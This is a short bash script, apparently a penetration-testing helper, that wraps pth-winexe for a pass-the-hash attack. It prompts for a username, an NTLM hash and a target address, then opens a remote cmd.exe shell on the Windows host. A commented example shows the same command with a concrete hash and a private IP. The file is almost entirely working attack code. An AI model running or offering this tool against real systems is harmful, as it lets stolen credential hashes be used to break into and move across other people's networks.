#!/bin/bash

#pth-winexe -U Administrator%00000000000000000000000000000000:2892d26cdf84d7a70e2eb3b9f05c425e //192.168.123.10 cmd.exe


read -p "Enter the username: " user

read -p "Give me the hash you have: " hash

read -p "Enter the target address: "ip

pth-winexe -U $user%00000000000000000000000000000000:$hash //$ip cmd.exe 

echo -e "\n📅 Test Date: $(date)"
